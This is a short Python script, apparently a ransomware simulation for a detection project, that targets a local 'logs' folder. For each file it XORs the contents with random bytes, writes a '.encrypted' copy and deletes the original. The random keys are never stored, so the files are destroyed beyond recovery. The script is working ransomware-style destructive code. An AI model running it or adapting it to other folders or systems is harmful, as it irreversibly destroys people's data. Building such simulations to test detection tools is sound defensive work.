import os
import random
import shutil

# Set the path to the logs directory (absolute path to avoid errors)
target_folder = "C:/Users/Admin/Ransomware-Detection/logs"

def encrypt_files(folder):
    # Ensure the target folder exists
    if not os.path.exists(folder):
        print(f"Error: Folder {folder} does not exist.")
        return

    # Encrypt files in the folder
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        if os.path.isfile(file_path):
            print(f"Encrypting {file_path}")
            with open(file_path, 'rb') as file:
                data = file.read()
            encrypted_data = bytearray([b ^ random.randint(0, 255) for b in data])  # Simple XOR encryption
            with open(file_path + ".encrypted", 'wb') as file:
                file.write(encrypted_data)
            os.remove(file_path)  # Remove the original file

# Run the simulation
encrypt_files(target_folder)
